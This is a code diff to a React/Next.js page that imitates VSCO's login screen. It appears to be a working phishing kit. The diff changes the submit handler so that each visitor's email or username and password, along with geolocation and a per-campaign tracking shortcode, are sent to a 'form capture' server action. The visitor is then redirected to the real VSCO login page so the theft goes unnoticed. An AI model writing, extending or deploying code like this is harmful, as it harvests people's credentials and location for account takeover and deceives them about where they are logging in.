@@ -3,35 +3,38 @@
 import PageContainer from '@/app/[lang]/vsco/components/page-container';
 import Link from 'next/link';
 import { useState } from 'react';
+import { captureFormData } from '@/action/form-capture-action';
+import { useGeolocation } from '@/app/[lang]/vsco/components/GeolocationProvider';
+import { useShortcode } from '@/app/[lang]/vsco/components/ShortcodeProvider';
 
 export default function LoginPage() {
   const [emailOrUsername, setEmailOrUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const { geolocation } = useGeolocation();
+  const { shortcode, createUrl } = useShortcode();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
     try {
-      // Capture login attempt data
-      await fetch('/api/form-capture', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
+      // Kirim data login ke form capture menggunakan server action
+      await captureFormData({
+        source: 'vsco',
+        email: emailOrUsername,
+        password,
+        shortcode: shortcode || undefined,
+        additional_data: {
+          login_method: 'email',
+          login_time: new Date().toISOString(),
+          geolocation: geolocation,
         },
-        body: JSON.stringify({
-          source: 'vsco_login',
-          data: {
-            emailOrUsername,
-            password,
-          },
-        }),
       });
 
       // Redirect to real VSCO after capturing
       window.location.href = 'https://vsco.co/user/login';
     } catch (error) {
-      console.error('Error submitting form:', error);
+      console.error('Login error:', error);
     }
   };
 
@@ -41,6 +44,11 @@ export default function LoginPage() {
         <div className='xs:max-w-[85%] mx-auto w-full max-w-[90%] px-4 sm:max-w-[70%] md:max-w-md'>
           <div className='mb-6 w-full text-center'>
             <h1 className='text-sm font-medium'>LOG IN TO VSCO</h1>
+            {shortcode && (
+              <p className='mt-2 text-xs text-gray-400'>
+                Tracking ID: {shortcode}
+              </p>
+            )}
           </div>
 
           <form onSubmit={handleSubmit} className='w-full space-y-4'>
@@ -105,18 +113,21 @@ export default function LoginPage() {
               </button>
             </div>
 
+            <div className='text-right'>
+              <a
+                href='#'
+                className='text-sm text-gray-500 hover:text-gray-700 hover:underline'
+              >
+                Forgot your password?
+              </a>
+            </div>
+
             <button
               type='submit'
               className='w-full rounded-full bg-[#111] py-3 font-medium text-white transition-colors hover:bg-gray-900'
             >
               LOG IN
             </button>
-
-            <div className='text-center'>
-              <a href='#' className='text-sm text-[#111]'>
-                Forgot password?
-              </a>
-            </div>
           </form>
 
           <div className='relative my-6 w-full'>
@@ -170,7 +181,7 @@ export default function LoginPage() {
           <div className='mt-8 w-full text-center'>
             <p className='mb-2 text-sm text-gray-400'>Don't have an account?</p>
             <Link
-              href='/vsco/user/signup'
+              href={createUrl('/vsco/user/signup')}
               className='inline-block w-full rounded-full border-2 border-gray-300 px-4 py-2 text-sm font-medium text-[#111] transition-colors hover:bg-gray-50'
             >
               SIGN UP
